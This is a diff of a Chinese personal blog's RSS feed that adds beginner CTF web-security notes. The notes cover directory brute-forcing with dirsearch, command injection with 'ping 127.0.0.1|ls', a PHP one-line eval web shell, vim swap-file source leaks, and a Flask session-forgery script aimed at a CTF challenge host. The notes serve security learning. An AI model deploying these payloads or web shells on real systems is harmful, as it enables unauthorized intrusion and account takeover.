@@ -1,4 +1,19 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>nRevery's Blog</title><link>https://blog.nrevery.cn/</link><description>Recent content on nRevery's Blog</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright>nRevery</copyright><lastBuildDate>Mon, 28 Oct 2024 21:17:13 +0800</lastBuildDate><atom:link href="https://blog.nrevery.cn/index.xml" rel="self" type="application/rss+xml"/><item><title>训练营-第二阶段</title><link>https://blog.nrevery.cn/p/%E8%AE%AD%E7%BB%83%E8%90%A5-%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/</link><pubDate>Mon, 28 Oct 2024 21:17:13 +0800</pubDate><guid>https://blog.nrevery.cn/p/%E8%AE%AD%E7%BB%83%E8%90%A5-%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/</guid><description/></item><item><title>Web入门</title><link>https://blog.nrevery.cn/p/web%E5%85%A5%E9%97%A8/</link><pubDate>Sat, 26 Oct 2024 10:51:20 +0800</pubDate><guid>https://blog.nrevery.cn/p/web%E5%85%A5%E9%97%A8/</guid><description>&lt;h3 id="robots协议">robots协议&lt;/h3>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>nRevery's Blog</title><link>https://blog.nrevery.cn/</link><description>Recent content on nRevery's Blog</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright>nRevery</copyright><lastBuildDate>Sun, 01 Dec 2024 22:37:04 +0800</lastBuildDate><atom:link href="https://blog.nrevery.cn/index.xml" rel="self" type="application/rss+xml"/><item><title>记录一些小问题</title><link>https://blog.nrevery.cn/p/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%BA%9B%E5%B0%8F%E9%97%AE%E9%A2%98/</link><pubDate>Sun, 01 Dec 2024 22:37:04 +0800</pubDate><guid>https://blog.nrevery.cn/p/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%BA%9B%E5%B0%8F%E9%97%AE%E9%A2%98/</guid><description>&lt;h3 id="wsl突然打不开了重启也没用">wsl突然打不开了，重启也没用&lt;/h3>
+&lt;p>1.cmd下管理员权限执行&lt;code>netsh winsock reset&lt;/code>&lt;br>
+2.重启电脑&lt;br>
+&lt;a class="link" href="https://blog.csdn.net/qq_41048761/article/details/121420814" target="_blank" rel="noopener"
+>https://blog.csdn.net/qq_41048761/article/details/121420814&lt;/a>&lt;/p></description></item><item><title>训练营-第二阶段</title><link>https://blog.nrevery.cn/p/%E8%AE%AD%E7%BB%83%E8%90%A5-%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/</link><pubDate>Mon, 28 Oct 2024 21:17:13 +0800</pubDate><guid>https://blog.nrevery.cn/p/%E8%AE%AD%E7%BB%83%E8%90%A5-%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/</guid><description/></item><item><title>Web入门</title><link>https://blog.nrevery.cn/p/web%E5%85%A5%E9%97%A8/</link><pubDate>Sat, 26 Oct 2024 10:51:20 +0800</pubDate><guid>https://blog.nrevery.cn/p/web%E5%85%A5%E9%97%A8/</guid><description>&lt;p>[TOC]&lt;/p>
+&lt;h3 id="linux命令">linux命令&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">env &lt;span class="c1"># 环境变量&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">find &amp;lt;路径&amp;gt; -name &amp;lt;文件名&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">find . -name &lt;span class="s2">&amp;#34;example.txt&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">find /var/log -name &lt;span class="s2">&amp;#34;*.log&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">find . -iname &lt;span class="s2">&amp;#34;example.txt&amp;#34;&lt;/span> &lt;span class="c1"># 忽略大小写&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">find /home/user -name &lt;span class="s2">&amp;#34;*.txt&amp;#34;&lt;/span> -o -name &lt;span class="s2">&amp;#34;*.md&amp;#34;&lt;/span> &lt;span class="c1"># -o就是或&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">find . -name &lt;span class="s2">&amp;#34;*.tmp&amp;#34;&lt;/span> -exec rm &lt;span class="o">{}&lt;/span> &lt;span class="se">\;&lt;/span> &lt;span class="c1"># 删除所有 .tmp 文件&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="直接查看">直接查看&lt;/h3>
+&lt;p>源码，cookie&lt;/p>
+&lt;h3 id="robots协议-url后加robotstxt">robots协议-URL后加robots.txt&lt;/h3>
 &lt;p>robots协议（Robots Exclusion Protocol），也称为爬虫排除标准或robots.txt协议，是一种网站通过其根目录下的&lt;code>robots.txt&lt;/code>文件来告诉网络爬虫（搜索引擎的自动访问程序）哪些页面可以抓取，哪些页面不可以抓取的协议。这个协议由网站管理员设置，以控制搜索引擎如何索引他们的网站。&lt;/p>
 &lt;p>&lt;code>robots.txt&lt;/code>文件通常位于网站的根目录下，例如：&lt;code>http://www.example.com/robots.txt&lt;/code>。这个文件包含了一系列的规则，这些规则指定了哪些爬虫可以访问网站的哪些部分。这些规则通常包括：&lt;/p>
 &lt;ol>
@@ -19,15 +34,75 @@
 &lt;/li>
 &lt;/ol>
 &lt;p>robots协议是一个君子协议，它依赖于爬虫开发者遵守这些规则。虽然大多数主流搜索引擎都会遵守这个协议，但并不是所有爬虫都会这么做。此外，robots协议并不能阻止恶意用户直接访问网站内容，它只能限制爬虫的行为。&lt;/p>
-&lt;h3 id="备份文件">备份文件&lt;/h3>
+&lt;h3 id="备份文件-暴力破解">备份文件-暴力破解&lt;/h3>
 &lt;p>&lt;a class="link" href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener"
 >https://github.com/maurosoria/dirsearch&lt;/a>
 功能：Web 路径暴力破解器
 常见的备份文件后缀名有: .git .svn .swp .svn .~ .bak .bash_history&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">python&lt;/span> &lt;span class="n">dirsearch&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">py&lt;/span> &lt;span class="n">-u&lt;/span> &lt;span class="n">http&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">//&lt;/span>&lt;span class="mf">61.147&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">171&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mf">105&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">51018&lt;/span> &lt;span class="n">-e&lt;/span> &lt;span class="p">*&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="字典">字典&lt;/h3>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="爆破-字典">爆破-字典&lt;/h3>
 &lt;p>&lt;a class="link" href="https://github.com/rootphantomer/Blasting_dictionary" target="_blank" rel="noopener"
->https://github.com/rootphantomer/Blasting_dictionary&lt;/a>&lt;/p></description></item><item><title>Islet_runable</title><link>https://blog.nrevery.cn/p/islet_runable/</link><pubDate>Tue, 10 Sep 2024 10:42:30 +0800</pubDate><guid>https://blog.nrevery.cn/p/islet_runable/</guid><description>&lt;p>配置代理：
+>https://github.com/rootphantomer/Blasting_dictionary&lt;/a>&lt;/p>
+&lt;h3 id="修改请求头xffrefererclient-ipuser-agentvia">修改请求头xff，referer,Client-ip,user-agent,via&lt;/h3>
+&lt;p>&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20241125174729.png"
+loading="lazy"
+>
+&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20241125185410.png"
+loading="lazy"
+>&lt;/p>
+&lt;h3 id="命令的拼接">命令的拼接&lt;/h3>
+&lt;p>linux中，&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">ping 127.0.0.1&lt;span class="p">|&lt;/span>ls
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ping 127.0.0.1&lt;span class="p">;&lt;/span>ls
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="php类型比较">php类型比较&lt;/h3>
+&lt;p>&lt;a class="link" href="https://www.php.net/manual/zh/types.comparisons.php" target="_blank" rel="noopener"
+>https://www.php.net/manual/zh/types.comparisons.php&lt;/a>&lt;/p>
+&lt;h3 id="php语法">PHP语法&lt;/h3>
+&lt;p>&lt;a class="link" href="https://www.runoob.com/php/php-echo-print.html" target="_blank" rel="noopener"
+>https://www.runoob.com/php/php-echo-print.html&lt;/a>&lt;br>
+&lt;a class="link" href="https://www.cnblogs.com/gxngxngxn/p/17410173.html" target="_blank" rel="noopener"
+>https://www.cnblogs.com/gxngxngxn/p/17410173.html&lt;/a>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">system(&amp;#34;cat /flag&amp;#34;);
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="ping命令-rce-前端禁用命令执行">PING命令 RCE-前端禁用&amp;amp;命令执行&lt;/h3>
+&lt;p>方法一：JS禁用。在Firefox地址栏里输入“about:config”。
+在搜索栏输入“javascript.enabled”查找到首选项。
+点击鼠标右键选择“切换”，把“javascript.enabled”键值改为“false”
+方法二：JS Hook。控制台清空check_ip = function(){}
+方法三：直接发包。&lt;/p>
+&lt;h3 id="sql注入">sql注入&lt;/h3>
+&lt;p>hackbar爆数据库、表名、列名&lt;/p>
+&lt;h3 id="文件上传">文件上传&lt;/h3>
+&lt;p>一句话木马&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span> &lt;span class="o">@&lt;/span>&lt;span class="k">eval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">cmd&lt;/span>&lt;span class="p">]);&lt;/span> &lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>上传之后只要通过post传入cmd=system(&amp;ldquo;ls /&amp;rdquo;);等&lt;/p>
+&lt;h3 id="vim">vim&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">第一次意外退出产生的备份文件名为:.filename.swp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">第二次意外退出产生的备份文件名为:.filename.swo
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">第三次意外退出产生的备份文件名为:.filename.swn
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">---------------------------------------------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">当vim在编辑文档的过程中如果异常退出,则会产生缓存文件。第一次产生的缓存文件后缀为.swp,第二次则产生的缓存文件后缀为.swo,第三次产生的缓存文件后缀为.swn。
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>访问.index.php.swp可以得到index.php源码关键字段。&lt;/p>
+&lt;h3 id="凭证伪造">凭证伪造&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">pip3 install flask-unsign&lt;span class="o">[&lt;/span>wordlist&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>假设有字典pass.txt,指定字典爆破：&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">$ flask-unsign --unsign --cookie &lt;span class="s2">&amp;#34;eyJuYW1lIjoiMSJ9.ZF_Bhw.mawKGPKlVL8_XkcZE2bcVHe6pOE&amp;#34;&lt;/span> -w .&lt;span class="se">\p&lt;/span>ass.txt --no-literal-eval
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Session decodes to: &lt;span class="o">{&lt;/span>&lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span>: &lt;span class="s1">&amp;#39;1&amp;#39;&lt;/span>&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Starting brute-forcer with &lt;span class="m">8&lt;/span> threads..
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Found secret key after &lt;span class="m">2&lt;/span> attempts
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">b&lt;span class="s1">&amp;#39;LitCTF&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-py" data-lang="py">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">requests&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">string&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">subprocess&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">SECRET_KEY&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;LitCTF&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">cmd_out&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">subprocess&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">check_output&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="s1">&amp;#39;flask-unsign&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;--sign&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;--cookie&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;{&lt;/span>&lt;span class="se">\&amp;#39;&lt;/span>&lt;span class="s1">name&lt;/span>&lt;span class="se">\&amp;#39;&lt;/span>&lt;span class="s1">: &lt;/span>&lt;span class="se">\&amp;#39;&lt;/span>&lt;span class="s1">admin&lt;/span>&lt;span class="se">\&amp;#39;&lt;/span>&lt;span class="s1">}&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;--secret&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">SECRET_KEY&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">cookie&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s1">&amp;#39;session&amp;#39;&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">cmd_out&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">rstrip&lt;/span>&lt;span class="p">()}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">response&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">requests&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;http://node5.anna.nssctf.cn:28403/flag&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">cookies&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">cookie&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">response&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">text&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Islet_runable</title><link>https://blog.nrevery.cn/p/islet_runable/</link><pubDate>Tue, 10 Sep 2024 10:42:30 +0800</pubDate><guid>https://blog.nrevery.cn/p/islet_runable/</guid><description>&lt;p>配置代理：
 firefox - 设置 - 常规 - 网络设置&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-zsh" data-lang="zsh">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">export&lt;/span> &lt;span class="nv">https_proxy&lt;/span>&lt;span class="o">=&lt;/span>http://10.12.170.200:7890
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">export&lt;/span> &lt;span class="nv">http_proxy&lt;/span>&lt;span class="o">=&lt;/span>http://10.12.170.200:7890
